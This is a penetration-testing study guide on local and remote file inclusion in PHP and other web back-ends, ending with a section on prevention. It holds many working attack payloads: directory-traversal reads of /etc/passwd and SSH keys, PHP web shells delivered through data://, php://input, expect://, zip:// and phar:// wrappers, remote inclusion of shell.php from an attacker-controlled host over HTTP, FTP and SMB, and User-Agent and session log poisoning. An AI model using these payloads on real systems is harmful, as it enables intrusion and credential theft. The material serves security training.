# File Inclusions

Back-end languages (PHP, JS, Java, .NET) use HTTP parameters to pick what gets rendered — template engines pulling dynamic content via `?language=es` or `?page=about`. Control the path being loaded and you get Local File Inclusion: source code disclosure, credential/key leaks, and under the right conditions RCE. LFI is most often found in templating engines.

## Intro to File Inclusions

Vulnerable pattern per language — user-controlled parameter straight into a file-loading function:

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

PHP: `include()`, `include_once()`, `require()`, `require_once()`, `file_get_contents()`. NodeJS: `fs.readFile(path.join(__dirname, req.query.language)...)`, Express `res.render('/' + req.params.language + '/about.html')` (URL-path parameter, e.g. /about/en). Java: `<jsp:include file="<%= request.getParameter('language') %>" />` and `<c:import url=...>`. .NET: `Response.WriteFile()`, `@Html.Partial()`, `<!--#include file=...-->`.

**Read vs Execute vs Remote URL** — decides which attacks apply:

* PHP: include/include\_once (read+execute+remote), require/require\_once (read+execute, local only), file\_get\_contents (read+remote), fopen/file (read, local)
* NodeJS: res.render() executes; fs.readFile()/sendFile() only read
* Java: import (execute+remote); include (read only)
* .NET: include (execute+remote); @Html.Partial/@Html.RemotePartial/Response.WriteFile (read only)

Execute-capable functions → potential RCE; read-only → source code only. Any RFI is also an LFI; the reverse needs the function to allow remote URLs.

## Local File Inclusion (LFI)

Basic test — swap the parameter for a universal readable file:

```
?language=/etc/passwd          (Linux)
?language=C:\Windows\boot.ini  (Windows)
```

**Path traversal** — when the app prefixes a directory (`include("./languages/" . $_GET['language'])`), escape with `../` to the root:

```
?language=../../../../etc/passwd
```

Works whether or not the whole input is used, so default to it. `../` past root stays at root — overshooting is harmless, but find the minimum count for reports/exploits (`/var/www/html` = 3 levels).

**Filename prefix** (`include("lang_" . $_GET['language'])`) — prepend `/` to make the prefix a directory:

```
?language=/../../../etc/passwd
```

Not guaranteed (`lang_/` may not exist as a directory), and any prefix can break wrapper/RFI techniques.

**Appended extension** (`include($_GET['language'] . ".php")`) — `/etc/passwd` becomes `/etc/passwd.php`. Bypasses in the next sections; otherwise you're restricted to that extension (still useful for source disclosure).

**Second-order attacks** — poison a stored value (e.g. register the username `../../../etc/passwd`), then let another function pull a file based on that value (avatar download at `/profile/$username/avatar.png`). Devs protect direct input but trust DB values.

## Basic Bypasses

**Non-recursive `../` filters** (`str_replace('../', '', ...)`) — the filter runs once, so nested payloads survive the strip:

```
?language=....//....//....//....//etc/passwd
```

Also `..././`, `....\/`, `....////`.

**Encoding** — filters blocking `.` and `/` fall to URL encoding (encode everything, including dots):

```
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Double-encode for other filter types. Core PHP ≤5.3.4 was itself vulnerable to this; newer versions only fall to custom filters.

**Approved-path regexes** (`preg_match('/^\.\/languages\/.+$/', ...)`) — find the approved path from the app's own form requests (or fuzz), then start with it and traverse out:

```
?language=./languages/../../../../etc/passwd
```

Combine with encoding/recursive payloads when stacked filters exist.

**Appended extension bypasses** — both obsolete on modern PHP, valid on old servers:

*   **Path truncation** (PHP <5.3/5.4): strings cap at 4096 chars, trailing `/.` stripped, extra slashes ignored. Pad with `./` until the appended `.php` is truncated off:

    ```bash
    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
    ```

    Must start with a non-existing directory.
* **Null bytes** (PHP <5.5): `%00` terminates the string — `/etc/passwd%00` cuts the appended `.php`.

## PHP Filters

PHP wrappers access I/O streams and extend LFI into source-code reading and RCE. The filter wrapper takes `resource` (the stream to filter) and `read` (the filter to apply); the useful filter is `convert.base64-encode` (Conversion Filters family).

Fuzz for PHP files first:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

Don't filter to 200 — with LFI you can read 301/302/403 pages' source too. Read sources → harvest referenced includes → read those, until the app's structure is mapped.

Including a PHP file executes it (config renders as empty). To read the source instead:

```
?language=php://filter/read=convert.base64-encode/resource=config
```

The returned base64 string decodes to the source (`echo '...' | base64 -d`). Resource goes at the end when `.php` gets appended. Hunt the result for credentials/DB keys and more file references. (Same principle for other languages — only needed where the function executes files.)

## PHP Wrappers

Quick-win RCE paths before wrappers: leak creds from config files, check `~/.ssh/id_rsa` per user, SSH in. Otherwise:

**Check `allow_url_include` first** — required for `data://`, `input://`, and all RFI. Read the config through LFI (grep for expect too while there):

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# path: /etc/php/X.Y/apache2/php.ini (Apache) or /etc/php/X.Y/fpm/php.ini (Nginx); try version numbers downward
echo 'W1BIUF0...' | base64 -d | grep allow_url_include
```

Not default-on, but some WordPress plugins/themes need it.

**data://** — include PHP code inline, base64 to dodge restrictions:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

**php://input** — same, but the payload rides as POST body (param must accept POST):

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

GET command passing needs `$_REQUEST`; POST-only functions → hardcode the command in the payload.

**expect://** — direct command execution, no web shell; external extension, must be installed (`extension=expect` in php.ini — grep the decoded config). Config directive ≠ loaded, so test it live:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

## Remote File Inclusion (RFI)

Include remote URLs → SSRF into local-only ports/apps, or RCE by hosting a script yourself. RFI-capable functions: PHP include/include\_once and file\_get\_contents (read-only), Java import, .NET include and @Html.RemotePartial (read-only). LFI ≠ RFI when: the function disallows remote URLs, you only control part of the filename (can't reach the `http://` wrapper position), or config blocks it.

**Verify** by including a local URL first (`http://127.0.0.1:80/index.php` — avoid including the vulnerable page itself: recursive-inclusion DoS). If the page renders, RFI + execution both work. Port control = SSRF to other local apps.

**RCE** — host `<?php system($_GET["cmd"]); ?>` as `shell.php` and include it. Prefer ports 80/443 (likely egress-whitelisted):

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

```
?language=http://<ATTACKER_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

Watch your own server logs — if `.php` gets appended to the request, drop the extension from your payload.

**FTP** — when HTTP ports/WAF-blocked strings are the problem:

```bash
sudo python -m pyftpdlib -p 21
```

```
?language=ftp://<ATTACKER_IP>/shell.php&cmd=id
?language=ftp://user:pass@<ATTACKER_IP>/shell.php&cmd=id    (auth required)
```

**SMB (Windows targets)** — no `allow_url_include` needed; Windows treats remote SMB files as normal files via UNC paths:

```bash
impacket-smbserver -smb2support share $(pwd)
```

```
?language=\\<ATTACKER_IP>\share\shell.php&cmd=whoami
```

Most reliable on the same network — remote SMB over the internet is usually disabled.

## LFI and File Uploads

The upload form doesn't need to be vulnerable — only present. Any execute-capable function runs PHP inside an uploaded file regardless of extension or type.

**Malicious image** (magic bytes + shell, harmless alone, RCE when included):

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

GIF chosen for ASCII-typable magic bytes; works with any allowed type. Upload, grab the path from the rendered `<img src="/profile_images/shell.gif">` (or fuzz for the uploads dir), include:

```
?language=./profile_images/shell.gif&cmd=id
```

`../` out first if the LFI prefixes a directory.

**zip:// wrapper** (not enabled by default) — zip a PHP shell into an image-named archive, reference the inner file with URL-encoded `#`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

**phar:// wrapper** — build with a stub and a shell sub-file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

Both are fallbacks — the plain image upload is the reliable one. (Obsolete footnote: LFI + uploads enabled + old PHP + exposed phpinfo() enables a classic temp-file attack — rare prerequisites.)

## Log Poisoning

Write PHP into any field that lands in a readable log file, then include that file through LFI. Needs read privileges on the log (varies by server).

**PHP Session Poisoning** — session files live at `/var/lib/php/sessions/sess_<PHPSESSID>` (Linux) / `C:\Windows\Temp\` (Windows). Read yours through LFI, find a controllable value (module case: the `page` value tracks the `?language=` param). Confirm control, poison with a URL-encoded web shell, then include the session file:

```
?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E     # poison
?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id # execute
```

Each inclusion overwrites the poisoned value — re-poison per command, or use the one shot to write a permanent shell / fire a reverse shell.

**Server Log Poisoning** — Apache/Nginx log the User-Agent; poison it via Burp (intercept + edit UA) or cURL:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']);?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

Then:

```
?language=/var/log/apache2/access.log&cmd=id
```

Log locations: Apache `/var/log/apache2/` (Linux) / `C:\xampp\apache\logs\` (Windows); Nginx `/var/log/nginx/` / `C:\nginx\log\`. Nginx logs are readable by low-priv users (`www-data`) by default; Apache logs need root/adm unless old or misconfigured. Logs are huge — loading them can be slow or crash the server; don't send junk requests.

Same trick via `/proc`: the UA also appears in `/proc/self/environ` and `/proc/self/fd/N` (N usually 0–50) — usually privileged-only, but a fallback when logs are unreadable. Any readable service log that records a controllable field works the same way — `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log` (poison SSH/FTP usernames, mail body with PHP code). Generalize: controllable field + readable log = poisoning target.

## Automated Scanning

Automate the trivial cases; keep manual skills for custom payloads and WAF workarounds.

**Fuzz parameters** — non-form params are less tested:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

`-fs` = filter the default response size. Applies to any web vuln class, not just LFI.

**LFI payload wordlists:**

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

LFI-Jhaddix covers bypasses and common files in one pass — manually verify hits.

**Server webroot** (needed when relative paths can't reach uploads etc.) — fuzz common webroot paths with traversal prepended:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

**Server logs/configs** — dedicated lists (LFI-WordList-Linux, non-seclists, download first) find far more than Jhaddix:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

Then chase findings manually: `apache2.conf` yields `DocumentRoot /var/www/html` and `${APACHE_LOG_DIR}/access.log`; the variable resolves in `/etc/apache2/envvars` (`export APACHE_LOG_DIR=/var/log/apache2`). This file-to-file pivoting mirrors the PHP-filters source-reading loop.

**LFI tools** — LFISuite, LFiFreak, liffy. Mostly unmaintained python2; may save time, will miss things.

## File Inclusion Prevention

* **Best fix:** never pass user input into inclusion functions/APIs — load assets server-side only. Otherwise whitelist: match user input (IDs, names) to files via a DB table, case-match script, or JSON map; the matched file (not the raw input) goes into the function, with a default for everything else.
*   **Directory traversal:** strip to the filename with built-ins — PHP `basename()` (native functions get edge cases fixed; hand-rolled ones don't — e.g. Bash wildcards `cat .?/.*/.?/etc/passwd` slip past naive filters when PHP shells out via `system()`). Or sanitize recursively:

    ```php
    while(substr_count($input, '../', 0)) {
        $input = str_replace('../', '', $input);
    };
    ```
* **Server config:** `allow_url_fopen = Off` and `allow_url_include = Off`; lock the app to the webroot (`open_basedir = /var/www` in php.ini, or Docker); disable dangerous modules (PHP Expect, mod\_userdir). LFI survives, but impact drops to the web folder.
* **WAF (ModSecurity):** start in permissive mode (report-only) to tune rules without blocking legitimate traffic — even permanently permissive, it's an early-warning tripwire. Hardening buys detection time (M-Trends 2020: average breach detection was 30 days); keep testing hardened systems, especially after zero-days in related frameworks — unique logs from a hardened environment confirm whether an exploit actually landed.
